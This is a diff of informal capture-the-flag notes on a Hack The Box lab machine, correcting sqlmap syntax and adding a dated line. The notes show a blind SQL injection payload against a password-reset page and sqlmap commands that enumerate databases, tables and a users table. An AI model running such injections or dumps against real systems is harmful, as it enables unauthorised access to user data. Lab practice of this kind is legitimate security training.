@@ -23,17 +23,20 @@
 ## Foothold
 --[+] :  Blind sql injection on http://usage.htb/forget-password  :
       >> payload : ' AND 1=1;-- -
-      >> sqlmap req.txt --risk=3 --level=5 --batch --dbms=mysql --dbs
+      >> sqlmap -r req.txt --risk=3 --level=5 --batch --dbms=mysql --dbs
 
 available databases [3]:
 [*] information_schema
 [*] performance_schema
 [*] usage_blog
 
-      >> sqlmap req.txt --risk=3 --level=5 --batch -D usage_blog --tables
-      >> sqlmap req.txt --risk=3 --level=5 --batch -D usage_blog -T users
+      >> sqlmap -r req.txt --risk=3 --level=5 --batch -D usage_blog --tables
+      >> sqlmap -r req.txt --risk=3 --level=5 --batch -D usage_blog -T users
       
       dump is fucked up lets see another time ... maybe machine down 
+      
+      //15-06-2024 -> completing the machine 
+      
        
 --[+] :  Target IP :
 
